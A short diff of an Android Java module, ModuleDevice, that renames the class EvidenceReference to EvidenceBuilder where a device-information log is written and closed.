@@ -27,7 +27,7 @@ import com.android.deviceinfo.Device;
 import com.android.deviceinfo.Status;
 import com.android.deviceinfo.auto.Cfg;
 import com.android.deviceinfo.conf.ConfModule;
-import com.android.deviceinfo.evidence.EvidenceReference;
+import com.android.deviceinfo.evidence.EvidenceBuilder;
 import com.android.deviceinfo.evidence.EvidenceType;
 import com.android.deviceinfo.util.Check;
 import com.android.deviceinfo.util.WChar;
@@ -163,7 +163,7 @@ public class ModuleDevice extends BaseInstantModule {
 		final String content = sb.toString();
 
 		// log
-		final EvidenceReference log = new EvidenceReference(EvidenceType.DEVICE);
+		final EvidenceBuilder log = new EvidenceBuilder(EvidenceType.DEVICE);
 		log.write(WChar.getBytes(content, true));
 		log.close();
 
